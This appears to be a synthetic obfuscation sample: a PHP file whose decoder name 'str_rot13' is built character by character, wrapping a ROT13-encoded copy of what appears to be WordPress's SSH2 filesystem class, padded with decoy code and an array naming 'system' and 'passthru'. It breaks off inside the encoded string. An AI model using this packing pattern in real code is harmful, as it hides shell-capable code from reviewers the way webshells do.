<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JbeqCerff Svyrflfgrz Pynff sbe vzcyrzragvat FFU2
 *
 * Gb hfr guvf pynff lbh zhfg sbyybj gurfr fgrcf sbe CUC 5.2.6+
 *
 * {@yvax uggc://xriva.inambaariryq.arg/grpuoybt/negvpyr/znxr_ffu_pbaarpgvbaf_jvgu_cuc/ - Vafgnyyngvba Abgrf}
 *
 * Pbzcvyr yvoffu2 (Abgr: Bayl 0.14 vf bssvpvnyyl jbexvat jvgu CUC 5.2.6+ evtug abj, Ohg znal hfref unir sbhaq gur yngrfg irefvbaf jbex)
 *
 * pq /hfe/fep
 * jtrg uggcf://jjj.yvoffu2.bet/qbjaybnq/yvoffu2-0.14.gne.tm
 * gne -mkis yvoffu2-0.14.gne.tm
 * pq yvoffu2-0.14/
 * ./pbasvther
 * znxr nyy vafgnyy
 *
 * Abgr: Qb abg yrnir gur qverpgbel lrg!
 *
 * Ragre: crpy vafgnyy -s ffu2
 *
 * Pbcl gur ffu.fb svyr vg perngrf gb lbhe CUC Zbqhyr Qverpgbel.
 * Bcra hc lbhe CUC.VAV svyr naq ybbx sbe jurer rkgrafvbaf ner cynprq.
 * Nqq va lbhe CUC.vav svyr: rkgrafvba=ffu2.fb
 *
 * Erfgneg Ncnpur!
 * Purpx cucvasb() fgernzf gb pbasvez gung: ffu2.furyy, ffu2.rkrp, ffu2.ghaary, ffu2.fpc, ffu2.fsgc  rkvfg.
 *
 * Abgr: Nf bs JbeqCerff 2.8, guvf hgvyvmrf gur CUC5+ shapgvba `fgernz_trg_pbagragf()`.
 *
 * @fvapr 2.7.0
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Svyrflfgrz
 */
pynff JC_Svyrflfgrz_FFU2 rkgraqf JC_Svyrflfgrz_Onfr {

	/**
	 * @fvapr 2.7.0
	 * @ine erfbhepr
	 */
	choyvp $yvax = snyfr;

	/**
	 * @fvapr 2.7.0
	 * @ine erfbhepr
	 */
	choyvp $fsgc_yvax;

	/**
	 * @fvapr 2.7.0
	 * @ine obby
	 */
	choyvp $xrlf = snyfr;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz neenl $bcg
	 */
	choyvp shapgvba __pbafgehpg( $bcg = '' ) {
		$guvf->zrgubq = 'ffu2';
		$guvf->reebef = arj JC_Reebe();

		// Purpx vs cbffvoyr gb hfr ffu2 shapgvbaf.
		vs ( ! rkgrafvba_ybnqrq( 'ffu2' ) ) {
			$guvf->reebef->nqq( 'ab_ffu2_rkg', __( 'Gur ffu2 CUC rkgrafvba vf abg ninvynoyr' ) );
			erghea;
		}

		// Frg qrsnhygf:
		vs ( rzcgl( $bcg['cbeg'] ) ) {
			$guvf->bcgvbaf['cbeg'] = 22;
		} ryfr {
			$guvf->bcgvbaf['cbeg'] = $bcg['cbeg'];
		}

		vs ( rzcgl( $bcg['ubfganzr'] ) ) {
			$guvf->reebef->nqq( 'rzcgl_ubfganzr', __( 'FFU2 ubfganzr vf erdhverq' ) );
		} ryfr {
			$guvf->bcgvbaf['ubfganzr'] = $bcg['ubfganzr'];
		}

		// Purpx vs gur bcgvbaf cebivqrq ner BX.
		vs ( ! rzcgl( $bcg['choyvp_xrl'] ) && ! rzcgl( $bcg['cevingr_xrl'] ) ) {
			$guvf->bcgvbaf['choyvp_xrl']  = $bcg['choyvp_xrl'];
			$guvf->bcgvbaf['cevingr_xrl'] = $bcg['cevingr_xrl'];

			$guvf->bcgvbaf['ubfgxrl'] = neenl( 'ubfgxrl' => 'ffu-efn,ffu-rq25519' );

			$guvf->xrlf = gehr;
		} ryfrvs ( rzcgl( $bcg['hfreanzr'] ) ) {
			$guvf->reebef->nqq( 'rzcgl_hfreanzr', __( 'FFU2 hfreanzr vf erdhverq' ) );
		}

		vs ( ! rzcgl( $bcg['hfreanzr'] ) ) {
			$guvf->bcgvbaf['hfreanzr'] = $bcg['hfreanzr'];
		}

		vs ( rzcgl( $bcg['cnffjbeq'] ) ) {
			// Cnffjbeq pna or oynax vs jr ner hfvat xrlf.
			vs ( ! $guvf->xrlf ) {
				$guvf->reebef->nqq( 'rzcgl_cnffjbeq', __( 'FFU2 cnffjbeq vf erdhverq' ) );
			} ryfr {
				$guvf->bcgvbaf['cnffjbeq'] = ahyy;
			}
		} ryfr {
			$guvf->bcgvbaf['cnffjbeq'] = $bcg['cnffjbeq'];
		}
	}

	/**
	 * Pbaarpgf svyrflfgrz.
	 *
	 * @fvapr 2.7.0
	 *
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba pbaarpg() {
		vs ( ! $guvf->xrlf ) {
			$guvf->yvax = @ffu2_pbaarpg( $guvf->bcgvbaf['ubfganzr'], $guvf->bcgvbaf['cbeg'] );
		} ryfr {
			$guvf->yvax = @ffu2_pbaarpg( $guvf->bcgvbaf['ubfganzr'], $guvf->bcgvbaf['cbeg'], $guvf->bcgvbaf['ubfgxrl'] );
		}

		vs ( ! $guvf->yvax ) {
			$guvf->reebef->nqq(
				'pbaarpg',
				fcevags(
					/* genafyngbef: %f: ubfganzr:cbeg */
					__( 'Snvyrq gb pbaarpg gb FFU2 Freire %f' ),
					$guvf->bcgvbaf['ubfganzr'] . ':' . $guvf->bcgvbaf['cbeg']
				)
			);

			erghea snyfr;
		}

		vs ( ! $guvf->xrlf ) {
			vs ( ! @ffu2_nhgu_cnffjbeq( $guvf->yvax, $guvf->bcgvbaf['hfreanzr'], $guvf->bcgvbaf['cnffjbeq'] ) ) {
				$guvf->reebef->nqq(
					'nhgu',
					fcevags(
						/* genafyngbef: %f: Hfreanzr. */
						__( 'Hfreanzr/Cnffjbeq vapbeerpg sbe %f' ),
						$guvf->bcgvbaf['hfreanzr']
					)
				);

				erghea snyfr;
			}
		} ryfr {
			vs ( ! @ffu2_nhgu_choxrl_svyr( $guvf->yvax, $guvf->bcgvbaf['hfreanzr'], $guvf->bcgvbaf['choyvp_xrl'], $guvf->bcgvbaf['cevingr_xrl'], $guvf->bcgvbaf['cnffjbeq'] ) ) {
				$guvf->reebef->nqq(
					'nhgu',
					fcevags(
						/* genafyngbef: %f: Hfreanzr. */
						__( 'Choyvp naq Cevingr xrlf vapbeerpg sbe %f' ),
						$guvf->bcgvbaf['hfreanzr']
					)
				);

				erghea snyfr;
			}
		}

		$guvf->fsgc_yvax = ffu2_fsgc( $guvf->yvax );

		vs ( ! $guvf->fsgc_yvax ) {
			$guvf->reebef->nqq(
				'pbaarpg',
				fcevags(
					/* genafyngbef: %f: ubfganzr:cbeg */
					__( 'Snvyrq gb vavgvnyvmr n FSGC fhoflfgrz frffvba jvgu gur FFU2 Freire %f' ),
					$guvf->bcgvbaf['ubfganzr'] . ':' . $guvf->bcgvbaf['cbeg']
				)
			);

			erghea snyfr;
		}

		erghea gehr;
	}

	/**
	 * Trgf gur ffu2.fsgc CUC fgernz jenccre cngu gb bcra sbe gur tvira svyr.
	 *
	 * Guvf zrgubq nyfb jbexf nebhaq n CUC oht jurer gur ebbg qverpgbel (/) pnaabg
	 * or bcrarq ol CUC shapgvbaf, pnhfvat n snyfr snvyher. Va beqre gb jbex nebhaq
	 * guvf, gur cngu vf pbairegrq gb /./ juvpu vf frznagvpnyyl gur fnzr nf /
	 * Frr uggcf://ohtf.cuc.arg/oht.cuc?vq=64169 sbe zber qrgnvyf.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $cngu Gur Svyr/Qverpgbel cngu ba gur erzbgr freire gb erghea
	 * @erghea fgevat Gur ffu2.fsgc:// jenccrq cngu gb hfr.
	 */
	choyvp shapgvba fsgc_cngu( $cngu ) {
		vs ( '/' === $cngu ) {
			$cngu = '/./';
		}

		erghea 'ffu2.fsgc://' . $guvf->fsgc_yvax . '/' . ygevz( $cngu, '/' );
	}

	/**
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $pbzznaq
	 * @cnenz obby   $ergheaobby
	 * @erghea obby|fgevat Gehr ba fhpprff, snyfr ba snvyher. Fgevat vs gur pbzznaq jnf rkrphgrq, `$ergheaobby`
	 *                     vf snyfr (qrsnhyg), naq qngn sebz gur erfhygvat fgernz jnf ergevrirq.
	 */
	choyvp shapgvba eha_pbzznaq( $pbzznaq, $ergheaobby = snyfr ) {
		vs ( ! $guvf->yvax ) {
			erghea snyfr;
		}

		$fgernz = ffu2_rkrp( $guvf->yvax, $pbzznaq );

		vs ( ! $fgernz ) {
			$guvf->reebef->nqq(
				'pbzznaq',
				fcevags(
					/* genafyngbef: %f: Pbzznaq. */
					__( 'Hanoyr gb cresbez pbzznaq: %f' ),
					$pbzznaq
				)
			);
		} ryfr {
			fgernz_frg_oybpxvat( $fgernz, gehr );
			fgernz_frg_gvzrbhg( $fgernz, SF_GVZRBHG );
			$qngn = fgernz_trg_pbagragf( $fgernz );
			spybfr( $fgernz );

			vs ( $ergheaobby ) {
				erghea ( snyfr === $qngn ) ? snyfr : '' !== gevz( $qngn );
			} ryfr {
				erghea $qngn;
			}
		}

		erghea snyfr;
	}

	/**
	 * Ernqf ragver svyr vagb n fgevat.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $svyr Anzr bs gur svyr gb ernq.
	 * @erghea fgevat|snyfr Ernq qngn ba fhpprff, snyfr vs ab grzcbenel svyr pbhyq or bcrarq,
	 *                      be vs gur svyr pbhyqa'g or ergevrirq.
	 */
	choyvp shapgvba trg_pbagragf( $svyr ) {
		erghea svyr_trg_pbagragf( $guvf->fsgc_cngu( $svyr ) );
	}

	/**
	 * Ernqf ragver svyr vagb na neenl.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $svyr Cngu gb gur svyr.
	 * @erghea neenl|snyfr Svyr pbagragf va na neenl ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_pbagragf_neenl( $svyr ) {
		erghea svyr( $guvf->fsgc_cngu( $svyr ) );
	}

	/**
	 * Jevgrf n fgevat gb n svyr.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat    $svyr     Erzbgr cngu gb gur svyr jurer gb jevgr gur qngn.
	 * @cnenz fgevat    $pbagragf Gur qngn gb jevgr.
	 * @cnenz vag|snyfr $zbqr     Bcgvbany. Gur svyr crezvffvbaf nf bpgny ahzore, hfhnyyl 0644.
	 *                            Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba chg_pbagragf( $svyr, $pbagragf, $zbqr = snyfr ) {
		$erg = svyr_chg_pbagragf( $guvf->fsgc_cngu( $svyr ), $pbagragf );

		vs ( fgeyra( $pbagragf ) !== $erg ) {
			erghea snyfr;
		}

		$guvf->puzbq( $svyr, $zbqr );

		erghea gehr;
	}

	/**
	 * Trgf gur pheerag jbexvat qverpgbel.
	 *
	 * @fvapr 2.7.0
	 *
	 * @erghea fgevat|snyfr Gur pheerag jbexvat qverpgbel ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba pjq() {
		$pjq = ffu2_fsgc_ernycngu( $guvf->fsgc_yvax, '.' );

		vs ( $pjq ) {
			$pjq = genvyvatfynfuvg( gevz( $pjq ) );
		}

		erghea $pjq;
	}

	/**
	 * Punatrf pheerag qverpgbel.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $qve Gur arj pheerag qverpgbel.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba puqve( $qve ) {
		erghea $guvf->eha_pbzznaq( 'pq ' . $qve, gehr );
	}

	/**
	 * Punatrf gur svyr tebhc.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat     $svyr      Cngu gb gur svyr.
	 * @cnenz fgevat|vag $tebhc     N tebhc anzr be ahzore.
	 * @cnenz obby       $erphefvir Bcgvbany. Vs frg gb gehr, punatrf svyr tebhc erphefviryl.
	 *                              Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba putec( $svyr, $tebhc, $erphefvir = snyfr ) {
		vs ( ! $guvf->rkvfgf( $svyr ) ) {
			erghea snyfr;
		}

		vs ( ! $erphefvir || ! $guvf->vf_qve( $svyr ) ) {
			erghea $guvf->eha_pbzznaq( fcevags( 'putec %f %f', rfpncrfuryynet( $tebhc ), rfpncrfuryynet( $svyr ) ), gehr );
		}

		erghea $guvf->eha_pbzznaq( fcevags( 'putec -E %f %f', rfpncrfuryynet( $tebhc ), rfpncrfuryynet( $svyr ) ), gehr );
	}

	/**
	 * Punatrf svyrflfgrz crezvffvbaf.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat    $svyr      Cngu gb gur svyr.
	 * @cnenz vag|snyfr $zbqr      Bcgvbany. Gur crezvffvbaf nf bpgny ahzore, hfhnyyl 0644 sbe svyrf,
	 *                             0755 sbe qverpgbevrf. Qrsnhyg snyfr.
	 * @cnenz obby      $erphefvir Bcgvbany. Vs frg gb gehr, punatrf svyr crezvffvbaf erphefviryl.
	 *                             Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba puzbq( $svyr, $zbqr = snyfr, $erphefvir = snyfr ) {
		vs ( ! $guvf->rkvfgf( $svyr ) ) {
			erghea snyfr;
		}

		vs ( ! $zbqr ) {
			vs ( $guvf->vf_svyr( $svyr ) ) {
				$zbqr = SF_PUZBQ_SVYR;
			} ryfrvs ( $guvf->vf_qve( $svyr ) ) {
				$zbqr = SF_PUZBQ_QVE;
			} ryfr {
				erghea snyfr;
			}
		}

		vs ( ! $erphefvir || ! $guvf->vf_qve( $svyr ) ) {
			erghea $guvf->eha_pbzznaq( fcevags( 'puzbq %b %f', $zbqr, rfpncrfuryynet( $svyr ) ), gehr );
		}

		erghea $guvf->eha_pbzznaq( fcevags( 'puzbq -E %b %f', $zbqr, rfpncrfuryynet( $svyr ) ), gehr );
	}

	/**
	 * Punatrf gur bjare bs n svyr be qverpgbel.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat     $svyr      Cngu gb gur svyr be qverpgbel.
	 * @cnenz fgevat|vag $bjare     N hfre anzr be ahzore.
	 * @cnenz obby       $erphefvir Bcgvbany. Vs frg gb gehr, punatrf svyr bjare erphefviryl.
	 *                              Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba pubja( $svyr, $bjare, $erphefvir = snyfr ) {
		vs ( ! $guvf->rkvfgf( $svyr ) ) {
			erghea snyfr;
		}

		vs ( ! $erphefvir || ! $guvf->vf_qve( $svyr ) ) {
			erghea $guvf->eha_pbzznaq( fcevags( 'pubja %f %f', rfpncrfuryynet( $bjare ), rfpncrfuryynet( $svyr ) ), gehr );
		}

		erghea $guvf->eha_pbzznaq( fcevags( 'pubja -E %f %f', rfpncrfuryynet( $bjare ), rfpncrfuryynet( $svyr ) ), gehr );
	}

	/**
	 * Trgf gur svyr bjare.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $svyr Cngu gb gur svyr.
	 * @erghea fgevat|snyfr Hfreanzr bs gur bjare ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba bjare( $svyr ) {
		$bjarehvq = @svyrbjare( $guvf->fsgc_cngu( $svyr ) );

		vs ( ! $bjarehvq ) {
			erghea snyfr;
		}

		vs ( ! shapgvba_rkvfgf( 'cbfvk_trgcjhvq' ) ) {
			erghea $bjarehvq;
		}

		$bjareneenl = cbfvk_trgcjhvq( $bjarehvq );

		vs ( ! $bjareneenl ) {
			erghea snyfr;
		}

		erghea $bjareneenl['anzr'];
	}

	/**
	 * Trgf gur crezvffvbaf bs gur fcrpvsvrq svyr be svyrcngu va gurve bpgny sbezng.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $svyr Cngu gb gur svyr.
	 * @erghea fgevat Zbqr bs gur svyr (gur ynfg 3 qvtvgf).
	 */
	choyvp shapgvba trgpuzbq( $svyr ) {
		erghea fhofge( qrpbpg( @svyrcrezf( $guvf->fsgc_cngu( $svyr ) ) ), -3 );
	}

	/**
	 * Trgf gur svyr'f tebhc.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $svyr Cngu gb gur svyr.
	 * @erghea fgevat|snyfr Gur tebhc ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba tebhc( $svyr ) {
		$tvq = @svyrtebhc( $guvf->fsgc_cngu( $svyr ) );

		vs ( ! $tvq ) {
			erghea snyfr;
		}

		vs ( ! shapgvba_rkvfgf( 'cbfvk_trgtetvq' ) ) {
			erghea $tvq;
		}

		$tebhcneenl = cbfvk_trgtetvq( $tvq );

		vs ( ! $tebhcneenl ) {
			erghea snyfr;
		}

		erghea $tebhcneenl['anzr'];
	}

	/**
	 * Pbcvrf n svyr.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat    $fbhepr      Cngu gb gur fbhepr svyr.
	 * @cnenz fgevat    $qrfgvangvba Cngu gb gur qrfgvangvba svyr.
	 * @cnenz obby      $birejevgr   Bcgvbany. Jurgure gb birejevgr gur qrfgvangvba svyr vs vg rkvfgf.
	 *                               Qrsnhyg snyfr.
	 * @cnenz vag|snyfr $zbqr        Bcgvbany. Gur crezvffvbaf nf bpgny ahzore, hfhnyyl 0644 sbe svyrf,
	 *                               0755 sbe qvef. Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba pbcl( $fbhepr, $qrfgvangvba, $birejevgr = snyfr, $zbqr = snyfr ) {
		vs ( ! $birejevgr && $guvf->rkvfgf( $qrfgvangvba ) ) {
			erghea snyfr;
		}

		$pbagrag = $guvf->trg_pbagragf( $fbhepr );

		vs ( snyfr === $pbagrag ) {
			erghea snyfr;
		}

		erghea $guvf->chg_pbagragf( $qrfgvangvba, $pbagrag, $zbqr );
	}

	/**
	 * Zbirf n svyr be qverpgbel.
	 *
	 * Nsgre zbivat svyrf be qverpgbevrf, BCpnpur jvyy arrq gb or vainyvqngrq.
	 *
	 * Vs zbivat n qverpgbel snvyf, `pbcl_qve()` pna or hfrq sbe n erphefvir pbcl.
	 *
	 * Hfr `zbir_qve()` sbe zbivat qverpgbevrf jvgu BCpnpur vainyvqngvba naq n
	 * snyyonpx gb `pbcl_qve()`.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $fbhepr      Cngu gb gur fbhepr svyr be qverpgbel.
	 * @cnenz fgevat $qrfgvangvba Cngu gb gur qrfgvangvba svyr be qverpgbel.
	 * @cnenz obby   $birejevgr   Bcgvbany. Jurgure gb birejevgr gur qrfgvangvba vs vg rkvfgf.
	 *                            Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba zbir( $fbhepr, $qrfgvangvba, $birejevgr = snyfr ) {
		vs ( $guvf->rkvfgf( $qrfgvangvba ) ) {
			vs ( $birejevgr ) {
				// Jr arrq gb erzbir gur qrfgvangvba orsber jr pna eranzr gur fbhepr.
				$guvf->qryrgr( $qrfgvangvba, snyfr, 's' );
			} ryfr {
				// Vs jr'er abg birejevgvat, gur eranzr jvyy snvy, fb erghea rneyl.
				erghea snyfr;
			}
		}

		erghea ffu2_fsgc_eranzr( $guvf->fsgc_yvax, $fbhepr, $qrfgvangvba );
	}

	/**
	 * Qryrgrf n svyr be qverpgbel.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat       $svyr      Cngu gb gur svyr be qverpgbel.
	 * @cnenz obby         $erphefvir Bcgvbany. Vs frg gb gehr, qryrgrf svyrf naq sbyqref erphefviryl.
	 *                                Qrsnhyg snyfr.
	 * @cnenz fgevat|snyfr $glcr      Glcr bs erfbhepr. 's' sbe svyr, 'q' sbe qverpgbel.
	 *                                Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba qryrgr( $svyr, $erphefvir = snyfr, $glcr = snyfr ) {
		vs ( 's' === $glcr || $guvf->vf_svyr( $svyr ) ) {
			erghea ffu2_fsgc_hayvax( $guvf->fsgc_yvax, $svyr );
		}

		vs ( ! $erphefvir ) {
			erghea ffu2_fsgc_ezqve( $guvf->fsgc_yvax, $svyr );
		}

		$svyryvfg = $guvf->qveyvfg( $svyr );

		vs ( vf_neenl( $svyryvfg ) ) {
			sbernpu ( $svyryvfg nf $svyranzr => $svyrvasb ) {
				$guvf->qryrgr( $svyr . '/' . $svyranzr, $erphefvir, $svyrvasb['glcr'] );
			}
		}

		erghea ffu2_fsgc_ezqve( $guvf->fsgc_yvax, $svyr );
	}

	/**
	 * Purpxf vs n svyr be qverpgbel rkvfgf.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $cngu Cngu gb svyr be qverpgbel.
	 * @erghea obby Jurgure $cngu rkvfgf be abg.
	 */
	choyvp shapgvba rkvfgf( $cngu ) {
		erghea svyr_rkvfgf( $guvf->fsgc_cngu( $cngu ) );
	}

	/**
	 * Purpxf vs erfbhepr vf n svyr.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $svyr Svyr cngu.
	 * @erghea obby Jurgure $svyr vf n svyr.
	 */
	choyvp shapgvba vf_svyr( $svyr ) {
		erghea vf_svyr( $guvf->fsgc_cngu( $svyr ) );
	}

	/**
	 * Purpxf vs erfbhepr vf n qverpgbel.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $cngu Qverpgbel cngu.
	 * @erghea obby Jurgure $cngu vf n qverpgbel.
	 */
	choyvp shapgvba vf_qve( $cngu ) {
		erghea vf_qve( $guvf->fsgc_cngu( $cngu ) );
	}

	/**
	 * Purpxf vs n svyr vf ernqnoyr.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $svyr Cngu gb svyr.
	 * @erghea obby Jurgure $svyr vf ernqnoyr.
	 */
	choyvp shapgvba vf_ernqnoyr( $svyr ) {
		erghea vf_ernqnoyr( $guvf->fsgc_cngu( $svyr ) );
	}

	/**
	 * Purpxf vs n svyr be qverpgbel vf jevgnoyr.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $cngu Cngu gb svyr be qverpgbel.
	 * @erghea obby Jurgure $cngu vf jevgnoyr.
	 */
	choyvp shapgvba vf_jevgnoyr( $cngu ) {
		// CUC jvyy onfr vgf jevgnoyr purpxf ba flfgrz_hfre === svyr_bjare, abg ffu_hfre === svyr_bjare.
		erghea gehr;
	}

	/**
	 * Trgf gur svyr'f ynfg npprff gvzr.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $svyr Cngu gb svyr.
	 * @erghea vag|snyfr Havk gvzrfgnzc ercerfragvat ynfg npprff gvzr, snyfr ba snvyher.
	 */
	choyvp shapgvba ngvzr( $svyr ) {
		erghea svyrngvzr( $guvf->fsgc_cngu( $svyr ) );
	}

	/**
	 * Trgf gur svyr zbqvsvpngvba gvzr.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $svyr Cngu gb svyr.
	 * @erghea vag|snyfr Havk gvzrfgnzc ercerfragvat zbqvsvpngvba gvzr, snyfr ba snvyher.
	 */
	choyvp shapgvba zgvzr( $svyr ) {
		erghea svyrzgvzr( $guvf->fsgc_cngu( $svyr ) );
	}

	/**
	 * Trgf gur svyr fvmr (va olgrf).
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $svyr Cngu gb svyr.
	 * @erghea vag|snyfr Fvmr bs gur svyr va olgrf ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba fvmr( $svyr ) {
		erghea svyrfvmr( $guvf->fsgc_cngu( $svyr ) );
	}

	/**
	 * Frgf gur npprff naq zbqvsvpngvba gvzrf bs n svyr.
	 *
	 * Abgr: Abg vzcyrzragrq.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $svyr  Cngu gb svyr.
	 * @cnenz vag    $gvzr  Bcgvbany. Zbqvsvrq gvzr gb frg sbe svyr.
	 *                      Qrsnhyg 0.
	 * @cnenz vag    $ngvzr Bcgvbany. Npprff gvzr gb frg sbe svyr.
	 *                      Qrsnhyg 0.
	 */
	choyvp shapgvba gbhpu( $svyr, $gvzr = 0, $ngvzr = 0 ) {
		// Abg vzcyrzragrq.
	}

	/**
	 * Perngrf n qverpgbel.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat           $cngu  Cngu sbe arj qverpgbel.
	 * @cnenz vag|snyfr        $puzbq Bcgvbany. Gur crezvffvbaf nf bpgny ahzore (be snyfr gb fxvc puzbq).
	 *                                Qrsnhyg snyfr.
	 * @cnenz fgevat|vag|snyfr $pubja Bcgvbany. N hfre anzr be ahzore (be snyfr gb fxvc pubja).
	 *                                Qrsnhyg snyfr.
	 * @cnenz fgevat|vag|snyfr $putec Bcgvbany. N tebhc anzr be ahzore (be snyfr gb fxvc putec).
	 *                                Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba zxqve( $cngu, $puzbq = snyfr, $pubja = snyfr, $putec = snyfr ) {
		$cngu = hagenvyvatfynfuvg( $cngu );

		vs ( rzcgl( $cngu ) ) {
			erghea snyfr;
		}

		vs ( ! $puzbq ) {
			$puzbq = SF_PUZBQ_QVE;
		}

		vs ( ! ffu2_fsgc_zxqve( $guvf->fsgc_yvax, $cngu, $puzbq, gehr ) ) {
			erghea snyfr;
		}

		// Frg qverpgbel crezvffvbaf.
		ffu2_fsgc_puzbq( $guvf->fsgc_yvax, $cngu, $puzbq );

		vs ( $pubja ) {
			$guvf->pubja( $cngu, $pubja );
		}

		vs ( $putec ) {
			$guvf->putec( $cngu, $putec );
		}

		erghea gehr;
	}

	/**
	 * Qryrgrf n qverpgbel.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $cngu      Cngu gb qverpgbel.
	 * @cnenz obby   $erphefvir Bcgvbany. Jurgure gb erphefviryl erzbir svyrf/qverpgbevrf.
	 *                          Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba ezqve( $cngu, $erphefvir = snyfr ) {
		erghea $guvf->qryrgr( $cngu, $erphefvir );
	}

	/**
	 * Trgf qrgnvyf sbe svyrf va n qverpgbel be n fcrpvsvp svyr.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat $cngu           Cngu gb qverpgbel be svyr.
	 * @cnenz obby   $vapyhqr_uvqqra Bcgvbany. Jurgure gb vapyhqr qrgnvyf bs uvqqra (\".\" cersvkrq) svyrf.
	 *                               Qrsnhyg gehr.
	 * @cnenz obby   $erphefvir      Bcgvbany. Jurgure gb erphefviryl vapyhqr svyr qrgnvyf va arfgrq qverpgbevrf.
	 *                               Qrsnhyg snyfr.
	 * @erghea neenl|snyfr {
	 *     Neenl bs neenlf pbagnvavat svyr vasbezngvba. Snyfr vs hanoyr gb yvfg qverpgbel pbagragf.
	 *
	 *     @glcr neenl ...$0 {
	 *         Neenl bs svyr vasbezngvba. Abgr gung fbzr ryrzragf znl abg or ninvynoyr ba nyy svyrflfgrzf.
	 *
	 *         @glcr fgevat           $anzr        Anzr bs gur svyr be qverpgbel.
	 *         @glcr fgevat           $crezf       *avk ercerfragngvba bs crezvffvbaf.
	 *         @glcr fgevat           $crezfa      Bpgny ercerfragngvba bs crezvffvbaf.
	 *         @glcr snyfr            $ahzore      Svyr ahzore. Nyjnlf snyfr va guvf pbagrkg.
	 *         @glcr fgevat|snyfr     $bjare       Bjare anzr be VQ, be snyfr vs abg ninvynoyr.
	 *         @glcr fgevat|snyfr     $tebhc       Svyr crezvffvbaf tebhc, be snyfr vs abg ninvynoyr.
	 *         @glcr vag|fgevat|snyfr $fvmr        Fvmr bs svyr va olgrf. Znl or n ahzrevp fgevat.
	 *                                             Snyfr vs abg ninvynoyr.
	 *         @glcr vag|fgevat|snyfr $ynfgzbqhavk Ynfg zbqvsvrq havk gvzrfgnzc. Znl or n ahzrevp fgevat.
	 *                                             Snyfr vs abg ninvynoyr.
	 *         @glcr fgevat|snyfr     $ynfgzbq     Ynfg zbqvsvrq zbagu (3 yrggref) naq qnl (jvgubhg yrnqvat 0), be
	 *                                             snyfr vs abg ninvynoyr.
	 *         @glcr fgevat|snyfr     $gvzr        Ynfg zbqvsvrq gvzr, be snyfr vs abg ninvynoyr.
	 *         @glcr fgevat           $glcr        Glcr bs erfbhepr. 's' sbe svyr, 'q' sbe qverpgbel, 'y' sbe yvax.
	 *         @glcr neenl|snyfr      $svyrf       Vs n qverpgbel naq `$erphefvir` vf gehr, pbagnvaf nabgure neenl bs
	 *                                             svyrf. Snyfr vs hanoyr gb yvfg qverpgbel pbagragf.
	 *     }
	 * }
	 */
	choyvp shapgvba qveyvfg( $cngu, $vapyhqr_uvqqra = gehr, $erphefvir = snyfr ) {
		vs ( $guvf->vf_svyr( $cngu ) ) {
			$yvzvg_svyr = onfranzr( $cngu );
			$cngu       = qveanzr( $cngu );
